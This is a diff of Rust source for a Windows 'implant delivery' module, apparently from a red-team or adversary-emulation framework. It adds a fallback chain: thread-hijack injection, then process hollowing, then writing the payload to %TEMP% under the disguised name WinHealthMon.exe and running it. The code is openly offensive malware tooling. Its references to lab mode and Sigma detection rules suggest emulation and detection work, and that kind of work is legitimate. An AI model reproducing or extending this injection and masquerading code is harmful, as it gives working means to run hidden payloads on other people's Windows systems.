@@ -1,23 +1,25 @@
-//! Windows Implant Delivery — Drop-to-disk (lab mode)
-//!
-//! Drops the implant to a temp file and spawns it as a new process.
-//! Replaces CreateRemoteThread injection which crashed because the
-//! oxide implant is a PE binary, not shellcode.
-//!
-//! Detection artifacts:
-//! - File write to %TEMP%\WinHealthMon.exe
-//! - Process creation from %TEMP%
+//! Windows injection: WTH -> process hollowing -> drop-to-disk fallback.
+//! Detection artifacts documented in detection/sigma/injection_wth.yml and
+//! detection/sigma/injection_hollow.yml.
 
 #![cfg(windows)]
 
-use super::InjectionError;
+use super::{hollow, wth, InjectionError};
 
-/// Drop implant to temp and spawn as process.
-pub fn inject(payload: &[u8]) -> Result<(), InjectionError> {
-    let temp_path = std::env::temp_dir().join("WinHealthMon.exe");
-    std::fs::write(&temp_path, payload)
-        .map_err(|e| InjectionError::WriteFailed(e.to_string()))?;
-    std::process::Command::new(&temp_path)
+pub fn inject_with_fallback(payload: &[u8]) -> Result<(), InjectionError> {
+    if wth::inject(payload).is_ok() {
+        return Ok(());
+    }
+    if hollow::inject(payload).is_ok() {
+        return Ok(());
+    }
+    drop_to_disk(payload)
+}
+
+fn drop_to_disk(payload: &[u8]) -> Result<(), InjectionError> {
+    let p = std::env::temp_dir().join("WinHealthMon.exe");
+    std::fs::write(&p, payload).map_err(|e| InjectionError::WriteFailed(e.to_string()))?;
+    std::process::Command::new(&p)
         .spawn()
         .map_err(|e| InjectionError::ThreadFailed(e.to_string()))?;
     Ok(())
